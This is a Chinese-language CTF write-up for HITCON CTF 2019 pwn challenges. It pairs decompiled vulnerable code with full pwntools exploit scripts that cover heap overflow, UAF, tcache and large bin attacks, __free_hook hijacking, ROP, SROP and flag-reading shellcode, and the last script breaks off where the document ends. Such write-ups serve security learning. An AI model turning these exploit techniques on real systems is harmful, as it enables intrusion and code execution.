> 原文链接: https://www.anquanke.com//post/id/194005 


# HITCON CTF 2019 Pwn 题解


                                阅读量   
                                **1225827**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t0179da66afa4d121ec.png)](https://p5.ssl.qhimg.com/t0179da66afa4d121ec.png)



文件链接：[https://github.com/Ex-Origin/ctf-writeups/tree/master/hitcon_ctf_2019/pwn](https://github.com/Ex-Origin/ctf-writeups/tree/master/hitcon_ctf_2019/pwn)。

## Trick or Treat

一道 misc pwn，考验答题者的脑洞。

```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
`{`
  signed int i; // [rsp+4h] [rbp-2Ch]
  __int128 size; // [rsp+8h] [rbp-28h]
  __int64 v5; // [rsp+18h] [rbp-18h]
  _QWORD *v6; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  size = 0uLL;
  v5 = 0LL;
  v6 = 0LL;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  write(1, "Size:", 5uLL);
  __isoc99_scanf((__int64)"%lu", &amp;size);
  v6 = malloc(size);
  if ( v6 )
  `{`
    printf("Magic:%pn", v6);
    for ( i = 0; i &lt;= 1; ++i )
    `{`
      write(1, "Offset &amp; Value:", 0x10uLL);
      __isoc99_scanf((__int64)"%lx %lx", (char *)&amp;size + 8, &amp;v5);
      v6[*((_QWORD *)&amp;size + 1)] = v5;
    `}`
  `}`
  _exit(0);
`}`
```

思路：
- 申请的size足够大，使得其使用 mmap 进行内存申请，从而用其偏移计算 libc 地址
- 把 free_hook 指向 system
- ed 绕过滤
- !/bin/sh 执行shell
```
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './trick_or_treat'
# sh = process(execve_file, env=`{`'LD_PRELOAD': '/tmp/gdb_symbols.so'`}`)
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b free
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

sh.sendlineafter('Size:', str(0x40000))
sh.recvuntil('Magic:')
ptr_base = int(sh.recvuntil('n'), 16)
# Maybe different environments has different offset value.
libc_addr = ptr_base - 0x10 - 0x5b7000
log.success('libc_addr: ' + hex(libc_addr))

sh.recvuntil('Offset &amp; Value:')
offset = (libc_addr + libc.symbols['__free_hook']) - ptr_base
offset = int(offset / 8) + 0x10 ** 16
sh.sendline('%lx %lx' % (offset, libc_addr + libc.symbols['system']))

sh.recvuntil('Offset &amp; Value:')
sh.sendline('0' * 0x400 + ' ed')
sh.sendline('!/bin/sh')

sh.interactive()
clear()
```

## dadadb

来自 `Angel boy` 的题目，质量当然毋庸置疑。

其链表并没有什么问题，成链和解链都很正常。

漏洞比较简单，在 add 的时候，当对应的 链表 如果有 指针的话，则会把原先的 free 掉后再申请新的，但是其并没有更新其size，也就意味着使用的仍然是原先的size，如果原先的size本身就很大的话，无疑直接导致了 heap overflow。

```
int add()
`{`
  ...
  v2 = global_ptr[(unsigned __int8)Dst[0]];
  if ( !v2 )
    goto LABEL_14;
  while ( 1 )
  `{`
    v3 = v2-&gt;key;
    do
    `{`
      v4 = (unsigned __int8)v3[Dst - v2-&gt;key];
      v5 = (unsigned __int8)*v3 - v4;
      if ( (unsigned __int8)*v3 != v4 )
        break;
      ++v3;
    `}`
    while ( v4 );
    if ( !v5 )
      break;
    v2 = v2-&gt;next;
    if ( !v2 )
      goto LABEL_14;
  `}`
  if ( v2 )
  `{`
    HeapFree(hHeap, 0, v2-&gt;ptr);
    printf("Size:");
    v8 = GetStdHandle(0xFFFFFFF6);
    if ( !ReadFile(v8, Buffer, 0x10u, &amp;NumberOfBytesRead, 0i64) )
    `{`
      puts("read error");
      _exit(1);
    `}`
    v9 = NumberOfBytesRead;
    if ( Buffer[NumberOfBytesRead - 1] == 10 )
      Buffer[NumberOfBytesRead - 1] = 0;
    if ( Buffer[v9 - 2] == 13 )
      Buffer[v9 - 2] = 0;
    v10 = atoll(Buffer);
    if ( v10 &gt;= 0x1000 )
      v10 = 4096i64;
    v2-&gt;ptr = (char *)HeapAlloc(hHeap, 8u, v10);
    printf("Data:");
    v11 = v2-&gt;size;
    v12 = v2-&gt;ptr;
    v13 = GetStdHandle(0xFFFFFFF6);
    if ( !ReadFile(v13, v12, v11, &amp;NumberOfBytesRead, 0i64) )
    `{`
      puts("read error");
      _exit(1);
    `}`
    ...
  return puts("Done!");
`}`
```

### <a class="reference-link" name="%E6%80%9D%E8%B7%AF"></a>思路
- 控制其指针结构进行任意读。
由于我的Windows的dll是和靶机一样的，所以直接用 windbg 读 symbols 就行，假如靶机用的是一个比较冷门的dll，那么获取其对应的 symbols 应该也比较麻烦。
- 伪造假的 chunk 放入 FreeList，从而控制 data 段的 fp 指针。
- 利用 FILE – fread 进行任意写
这里和 Linux 的 fread 任意读类似。
- 劫持返回地址，进行 ROP 使得内存有可执行权限，然后跑 shellcode 读 flag。
在Windows 下进行 ROP 来读 flag 很麻烦，不如直接写 shellcode 来的快，这里我提醒一下，要注意 栈下溢，否则 ReadFile 时可能会出错。

### <a class="reference-link" name="%E8%84%9A%E6%9C%AC"></a>脚本

```
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import time

context.arch = 'amd64'
# context.log_level = 'debug'

sh = remote('192.168.3.129', 10001)

def login(user, passwd):
    sh.sendlineafter('&gt;&gt; ', '1')
    sh.sendafter('User:', user)
    sh.sendafter('Password:', passwd)

def add(key, size, data):
    sh.sendlineafter('&gt;&gt; ', '1')
    sh.sendafter('Key:', key)
    sh.sendlineafter('Size:', str(size))
    sh.sendafter('Data:', data)

def show(key):
    sh.sendlineafter('&gt;&gt; ', '2')
    sh.sendafter('Key:', key)
    sh.recvuntil('Data:')

def delete(key):
    sh.sendlineafter('&gt;&gt; ', '3')
    sh.sendafter('Key:', key)


login('orange', 'godlike')

add('11', 0x100, '11')
add('22', 0x30, '22')
add('11', 0x30, '11')
add('33', 0x200, '33')
show('11')
head = sh.recvn(0x40)
heap_addr = u64(sh.recvn(8)) - 0xa90
log.success('heap_addr: ' + hex(heap_addr))

add('11', 0x30, head + p64(heap_addr + 0x2c0))
show('33')
result = sh.recvn(8)

dot_data = 0x15f000
ntdll = (u64(result) - dot_data) &amp; 0xffffffffffff0000
log.success('ntdll: ' + hex(ntdll))

PebLdr_symbol = 0x1653c0
add('11', 0x30, head + p64(ntdll + PebLdr_symbol -  0xb8))
show('33')
Peb_addr = u64(sh.recvn(8)) &amp; 0xfffffffffffff000
log.success('Peb_addr: ' + hex(Peb_addr))

add('11', 0x30, head + p64(Peb_addr + 0x10))
show('33')
image_base_addr = u64(sh.recvn(8))
log.success('image_base_addr: ' + hex(image_base_addr))

Teb_addr = Peb_addr + 0x1000
add('11', 0x30, head + p64(Teb_addr + 8))
show('33')
stack_base = u64(sh.recvn(8))
log.success('stack_base: ' + hex(stack_base))

ret_content = p64(image_base_addr + 0x1E38)
main_ret = 0
offset = 0x200
while(True):
    add('11', 0x30, head + p64(stack_base - offset))
    show('33')
    result = sh.recvn(0x200)
    position = result.find(ret_content)
    if(position != -1):
        main_ret = stack_base - offset + position
        break
    offset += 0x200

log.success('main_ret: ' + hex(main_ret))

add('11', 0x30, head + p64(image_base_addr + 0x3000))
show('33')
ReadFile_addr = u64(sh.recvn(8))
KERNEL32 = ReadFile_addr - 0x22680
log.success('KERNEL32: ' + hex(KERNEL32))

# clear
add('clear', 0x50, 'clear')


add('44', 0x200, '44')
add('44', 0x50, '44')
add('55', 0x40, '55')
add('66', 0x40, '66')

# free
add('55', 0x50, '55')
add('66', 0x50, '66')

show('44')
result = sh.recvn(0x200)
xor_header = result[0x188: 0x190]


sh.sendlineafter('&gt;&gt; ', '4') #　logout
payload = xor_header + p64(heap_addr + 0xe50) + p64(heap_addr + 0xf10) # fake chunk
login('orange', 'godlike' + payload)

# UAF modify Flink and Blink
payload = result[: 0xd8] + p64(image_base_addr + 0x5658) + result[0xe0:0x190] + p64(image_base_addr + 0x5658)
add('44', 0x50, payload)

add('77', 0x40, '77')
add('88', 0x40, 'p' * 0x10 + p64(heap_addr + 0x1170)) # hijack FILE

fake_FILE = [
    0,
    main_ret - 0x280, # login ret
    p32(0), p32(0x2080),
    0,
    0x200,
    0,
    0xffffffffffffffff,
    p32(0xffffffff), p32(0),
    0,
    0,
]
add('99', 0x100, flat(fake_FILE))

sh.sendlineafter('&gt;&gt; ', '4') #　logout

login('aa', 'bb')

pop_rdx_ret = ntdll + 0x57642
pop_rcx_r8_r9_r10_r11_ret = ntdll + 0x8fb31

VirtualProtect = KERNEL32 + 0x1B680


layout = [
    pop_rdx_ret,
    0x1000,
    pop_rcx_r8_r9_r10_r11_ret,
    heap_addr,
    0x40, # PAGE_EXECUTE_READWRITE
    heap_addr + 0x1000,
    0,0,
    VirtualProtect,

    ntdll + 0x220dc, #: add rsp, 0x18; ret; 
    0,0,0,

    ntdll + 0x9217b, #: pop rcx; ret; 
    0xFFFFFFF6,
    KERNEL32 + 0x1c890, # GetStdHandle

    ntdll + 0x3537a, #: mov rcx, rax; mov rax, rcx; add rsp, 0x28; ret; 
    0,0,0,0,0,

    pop_rdx_ret,
    heap_addr,
    ntdll + 0x8fb32, #: pop r8; pop r9; pop r10; pop r11; ret; 
    0x100,
    heap_addr + 0x1100,
    0,
    0,
    KERNEL32 + 0x22680, # ReadFile
    heap_addr,
    0,0,0,
    0,
]

sh.send(flat(layout).ljust(0x100, ''))

time.sleep(1)

asm_str = '''
sub rsp, 0x1000 ;// to prevent underflowing

mov rax, 0x7478742e67616c66 ;// flag.txt
mov [rsp + 0x100], rax
mov byte ptr [rsp + 0x108], 0
lea rcx, [rsp + 0x100]
mov edx, 0x80000000
mov r8d, 1
xor r9d, r9d
mov dword ptr[rsp + 0x20], 3
mov dword ptr[rsp + 0x28], 0x80
mov [rsp + 0x30], r9
mov rax, %d
call rax ;// CreateFile

mov rcx, rax
lea rdx, [rsp + 0x200]
mov r8d, 0x200
lea r9, [rsp + 0x30]
xor eax, eax
mov [rsp + 0x20], rax
mov rax, %d
call rax ;// ReadFile

mov ecx, 0xfffffff5 ;// STD_OUTPUT_HANDLE
mov rax, %d
call rax ;// GetStdHandle

mov rcx, rax
lea rdx, [rsp + 0x200]
mov r8d, [rsp + 0x30]
lea r9, [rsp + 0x40]
xor eax, eax
mov [rsp + 0x20], rax
mov rax, %d
call rax ;// WriteFile

mov rax, %d
call rax ;// exit
''' % ( KERNEL32 + 0x222f0, KERNEL32 + 0x22680, KERNEL32 + 0x1c890, KERNEL32 + 0x22770, image_base_addr + 0x1B86)

shellcode = asm(asm_str)

sh.send(shellcode)

sh.interactive()
```



## Crypto in the Shell

这题比较简单，没有设置很多障碍，漏洞点也很明显，就是明显的数组溢出。

```
int __cdecl main(int argc, const char **argv, const char **envp)
`{`
  void *v3; // rsi
  signed int i; // [rsp+8h] [rbp-28h]
  __int64 offset; // [rsp+10h] [rbp-20h]
  size_t size; // [rsp+18h] [rbp-18h]
  void *local_buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v9; // [rsp+28h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  v3 = 0LL;
  setvbuf(stderr, 0LL, 2, 0LL);
  readkey();
  for ( i = 0; i &lt;= 31; ++i )
  `{`
    printf("offset:", v3);
    if ( scanf("%llu", &amp;offset) != 1 )
      break;
    printf("size:");
    v3 = &amp;size;
    if ( scanf("%llu", &amp;size) != 1 )
      break;
    if ( size )
    `{`
      size = (size &amp; 0xFFFFFFFFFFFFFFF0LL) + 16;
      local_buf = &amp;buf[offset];
      AESencrypt(&amp;AESkey, &amp;iv, &amp;buf[offset], size);
      v3 = local_buf;
      write(1, local_buf, size);
    `}`
  `}`
  return 0;
`}`
```

### <a class="reference-link" name="%E6%80%9D%E8%B7%AF"></a>思路
- 修改 key, iv 并泄露出来。
- 利用 key, iv 泄露出 libc、镜像、栈 地址。
- 修改 局部变量i ，使得我们有很多次机会
- 任意写
任意写的原理就是爆破一个字节，利用加密函数进行爆破使得其等于我们需要的那个字节，否则就继续爆破，知道出现预期结果为止。多个字节的话，单字节爆破叠加即可。

### <a class="reference-link" name="%E8%84%9A%E6%9C%AC"></a>脚本

概率 `1/2` ，成功的主要因数取决于 修改的`局部变量i` 是否为负数。

```
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal
from Crypto.Cipher import AES

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './chall'
# sh = process(execve_file, env=`{`'LD_PRELOAD': '/tmp/gdb_symbols.so'`}`)
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *$rebase(0x127F)
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def decrypt(key, iv, data):
    instance = AES.new(key, AES.MODE_CBC, iv)
    return instance.decrypt(data)

def run_service(offset, size):
    sh.sendlineafter('offset:', str(offset))
    sh.sendlineafter('size:', str(size))
    return sh.recvn((size &amp; 0xfffffff0) + 0x10)

# modify key,iv and get them
result = run_service(0xffffffffffffffe0, 0x10)
key = result[:0x10]
iv = result[0x10:]

# leak 
cipher = run_service(0xffffffffffffffc0, 1)
result = decrypt(key, iv, cipher)
libc_addr = u64(result[:8]) - libc.symbols['_IO_2_1_stderr_']
log.success('libc_addr: ' + hex(libc_addr))

cipher = run_service(0xfffffffffffffc60, 1)
result = decrypt(key, iv, cipher)
image_base_addr = u64(result[8:16]) - 0x202008
log.success('image_base_addr: ' + hex(image_base_addr))

offset = (libc_addr + libc.symbols['environ']) - (image_base_addr + elf.symbols['buf'])
cipher = run_service(offset, 1)
result = decrypt(key, iv, cipher)
stack_addr = u64(result[:8])
log.success('stack_addr: ' + hex(stack_addr))

# hijack local variable
i_addr = stack_addr - 0x120
offset = (i_addr) - (image_base_addr + elf.symbols['buf'])
run_service(offset, 1)

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

# arbitrary memory writing
one_gadget = p64(libc_addr + 0x4f322)
offset = (stack_addr - 0xf0) - (image_base_addr + elf.symbols['buf'])
for i in range(8):
    while(True):
        result = run_service(offset + i, 1)
        if(one_gadget[i] == result[0]):
            log.success('i : ' + str(i))
            break

print('')
content = '' * 8
offset = (libc_addr + libc.symbols['environ']) - (image_base_addr + elf.symbols['buf'])
for i in range(8):
    while(True):
        result = run_service(offset + i, 1)
        if(content[i] == result[0]):
            log.success('i : ' + str(i))
            break

sh.sendlineafter('offset:', 'a')

sh.interactive()
clear()
```

### <a class="reference-link" name="%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF"></a>另一种思路

由于有可以任意地址读，那么可以直接劫持 stdin 进行任意地址写。



## one punch man

靶机环境是 glibc-2.29 ，需要用到一些新特性来进行利用以达到任意代码执行。

```
void delete()
`{`
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  write_str("idx: ");
  v0 = get_int();
  if ( v0 &gt; 2 )
    error((__int64)"invalid");
  free((void *)heros[v0].calloc_ptr);
`}`
```

漏洞点在于 delete 时没有清理指针导致的 UAF ，程序使用的是 calloc 函数来获取 堆内存，这使得 tcache 就不能使用了，但是后门函数使用的仍然是malloc函数，不过我们需要满足其 tcache-&gt;counts 大于 6 才行。这就是该题的难点。

### <a class="reference-link" name="%E6%80%9D%E8%B7%AF"></a>思路
- 用 UAF 构造 chunk overlap
- 用 tcache-&gt;counts 来伪造 size， 用 tcache-&gt;entries 伪造 fake_chunk 的 fd 和 bk，提前布置好 堆布局，以便绕过 unlink 检查。
- unlink 控制 tcache-&gt;entries，劫持hook控制程序流，然后SROP再执行shellcode读取flag。
<li>
</li>
### <a class="reference-link" name="%E8%84%9A%E6%9C%AC"></a>脚本

```
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols`{``}`* /tmp/gdb_pid`{``}`* /tmp/gdb_script`{``}`*'.replace('`{``}`', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols`{``}`.c'.replace('`{``}`', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols`{``}`.c -o /tmp/gdb_symbols`{``}`.so'.replace('`{``}`', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols`{``}`.c -o /tmp/gdb_symbols`{``}`.so'.replace('`{``}`', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './one_punch'
# sh = process(execve_file, env=`{`'LD_PRELOAD': '/tmp/gdb_symbols`{``}`.so'.replace('`{``}`', salt)`}`)
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
libc = ELF('./libc-2.29.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''

    '''

    f = open('/tmp/gdb_pid`{``}`'.replace('`{``}`', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script`{``}`'.replace('`{``}`', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(index, content):
    sh.sendlineafter('&gt; ', '1')
    sh.sendlineafter('idx: ', str(index))
    sh.sendafter('name: ', content)

def edit(index, content):
    sh.sendlineafter('&gt; ', '2')
    sh.sendlineafter('idx: ', str(index))
    sh.sendafter('name: ', content)

def show(index):
    sh.sendlineafter('&gt; ', '3')
    sh.sendlineafter('idx: ', str(index))
    sh.recvuntil('name: ')
    return sh.recvuntil('n', drop=True)

def delete(index):
    sh.sendlineafter('&gt; ', '4')
    sh.sendlineafter('idx: ', str(index))

def backdoor(content):
    sh.sendlineafter('&gt; ', '50056')
    time.sleep(0.1)
    sh.send(content)

add(2, 'a' * 0x217)

for i in range(2):
    add(0, 'a' * 0x217)
    delete(0)

result = show(0)
heap_addr = u64(result.ljust(8, '')) &amp; 0xfffffffffffff000
log.success('heap_addr: ' + hex(heap_addr))

for i in range(5):
    add(0, 'a' * 0x217)
    delete(0)

delete(2)
result = show(2)
libc_addr = u64(result.ljust(8, '')) - 0x1e4ca0
log.success('libc_addr: ' + hex(libc_addr))

length = 0xe0
add(0, 'a' * length)
add(0, 'a' * 0x80)
edit(2, '' * length + p64(0) + p64(0x21))
delete(0)
edit(2, '' * length + p64(0) + p64(0x31))
delete(0)

edit(2, '' * length + p64(0) + p64(0x3a1))
delete(0)

for i in range(3):
    add(1, 'b' * 0x3a8)
    delete(1)

edit(2, '' * length + p64(0x300) + p64(0x570) + p64(0) + p64(0) + p64(heap_addr + 0x40) + p64(heap_addr + 0x40))
delete(0)

add(0, 'c' * 0x100 + p64(libc_addr + libc.symbols['__free_hook']) + '')

# 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; 
layout = [
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    10,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
    heap_addr + 0x260 + 0xf8,
]
backdoor(p64(libc_addr + 0x000000000012be97) + flat(layout) + '')
frame = SigreturnFrame()
frame.rdi = heap_addr
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = libc_addr + libc.symbols['__free_hook'] + 8
frame.rip = libc_addr + 0x55cc4 # ret

shellcode = asm('''
push 0x67616c66 ;// flag
mov rdi, rsp
xor esi, esi
mov eax, 2
syscall

cmp eax, 0
js fail

mov edi, eax
mov rsi, rsp
mov edx, 100
xor eax, eax
syscall ;// read

mov edx, eax
mov rsi, rsp
mov eax, 1
mov edi, eax
syscall ;// write

jmp exit

fail:
mov rax, 0x727265206e65706f ;// open error!
mov [rsp], rax
mov eax, 0x0a21726f
mov [rsp+8], rax
mov rsi, rsp
mov edi, 1
mov edx, 12
mov eax, edi
syscall ;// write


exit:
xor edi, edi
mov eax, 231
syscall 
''')
edit(2, p64(libc_addr + 0x55E35) + p64(heap_addr + 0x260) + str(frame)[0x10:] + shellcode)

delete(2)

sh.interactive()
clear()
```

### <a class="reference-link" name="%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF"></a>另一种思路

利用 large bin attack 攻击 tcache-&gt;counts ，那么可以绕过限制直接调用后门。



## LazyHouse

乘法溢出漏洞，重要输入的值满足下面的判断就能导致溢出。

```
unsigned long input;
if((218 * input &lt; 116630) &amp;&amp; ((input * 64) &gt; (218 * input)))
`{`
    puts("Multiplication overflow");
`}`
```

其原理是利用乘法的进位使得恰好溢出，并且得到的值小于`116630`，可以利用除法来进行反向计算获得其溢出的输出。

```
unsigned long input = -1;
input = input/218 + 1;
```

### <a class="reference-link" name="%E6%80%9D%E8%B7%AF"></a>思路
- 乘法溢出，解除 内存申请的限制
- chunk overlap，使得 heap 布局可以自由控制
- 泄露 heap 地址，和 libc 地址
- large bin attack 修改 global_max_fast ，使得可以继续使用fastbin
- fastbin attack 劫持 tcache
- 修改 hook ，利用 calloc 的特性进行栈转移。
- ROP 读 flag
通过调试靶机的 libc 可以发现 calloc 函数使用 rbp 当做寄存器变量来存储 传入的 size，所以我们可以控制其 size 进行栈转移。

### <a class="reference-link" name="%E8%84%9A%E6%9C%AC"></a>脚本

```
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './lazyhouse'
# sh = process(execve_file, env=`{`'LD_PRELOAD': '/tmp/gdb_symbols.so'`}`)
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
libc = ELF('./libc-2.29.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/gx $rebase(0x5010)
        x/24gx $rebase(0x5060)
        end

    b calloc
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(index, size, content):
    sh.sendlineafter('Your choice: ', '1')
    sh.sendlineafter('Index:', str(index))
    sh.sendlineafter('Size:', str(size))
    if(content):
        sh.sendafter('House:', content)

def show(index):
    sh.sendlineafter('Your choice: ', '2')
    sh.sendlineafter('Index:', str(index))

def delete(index):
    sh.sendlineafter('Your choice: ', '3')
    sh.sendlineafter('Index:', str(index))

def edit(index, content):
    sh.sendlineafter('Your choice: ', '4')
    sh.sendlineafter('Index:', str(index))
    sh.sendafter('House:', content)

def triger(content):
    sh.sendlineafter('Your choice: ', '5')
    sh.sendafter('House:', content)

# Multiplication overflow
add(0, 0x12c9fb4d812c9fc, None)
delete(0)

# chunk overlap
add(0, 0x88, 'n')
add(1, 0x248, 'n')
add(2, 0x248, 'n')
add(6, 0x248, 'n')
add(3, 0x88, 'n')
add(7, 0x88, 'n')
add(4, 0x448, 'n')

for i in range(7):
    add(5, 0x248, 'n')
    delete(5)

edit(0, 'a' * 0x80 + p64(0) + p64(0x781))
delete(1)
add(1, 0x338, 'b' * 0x240 + p64(0) + p64(0x251))
add(5, 0x600, 'n')
show(2)
sh.recvn(0xf0)
libc_addr = u64(sh.recvn(8)) - 1120 - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))

sh.recvn(8)

heap_addr = u64(sh.recvn(8)) &amp; 0xfffffffffffff000
log.success('heap_addr: ' + hex(heap_addr))

# large bin attack
delete(2)
add(2, 0x248, 'c' * 0xe0 + p64(0) + p64(0x441) + p64(libc_addr + 0x1e50a0) + p64(libc_addr + 0x1e50a0) + p64(0) + p64(libc_addr + 0x1e7600 - 0x20))
delete(4)
add(4, 0x88, 'n')

# fastbin attack
delete(4)
delete(2)
edit(1, 'd' * 0x240 + p64(0) + p64(0x251) + p64(heap_addr))

# for ROP
layout = [
    0,
    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    heap_addr + 0x540 + 0x100,
    libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
    0,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    2,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 

    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    3,
    libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
    heap_addr,
    libc_addr + 0x000000000012bda6, #: pop rdx; ret; 
    0x100,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    0,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 

    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    1,
    libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
    heap_addr,
    libc_addr + 0x000000000012bda6, #: pop rdx; ret; 
    0x100,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    1,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 

    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    0,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    231,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
]
add(2, 0x248, flat(layout).ljust(0x100, '') + './flag')

# hijack tcache
add(4, 0x248, '' * 0x40 + p64(0) * 0x20 + p64(libc_addr + libc.symbols['__malloc_hook']))

triger(p64(libc_addr + 0x0058373))
delete(4)

# triger ROP
sh.sendafter('Your choice: ', '1'.ljust(0x20, '0'))
sh.sendlineafter('Index:', str(4))
sh.sendlineafter('Size:', str(heap_addr + 0x540))

sh.interactive()
clear()
```

### <a class="reference-link" name="%E5%85%B6%E4%BB%96%E6%80%9D%E8%B7%AF"></a>其他思路
1. 利用 small bin 来劫持 tcache (balsn战队)
1. 利用 SROP 代替栈转移


## POE luna

借用作者的原话，直接分析二进制代码就足够了。

```
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
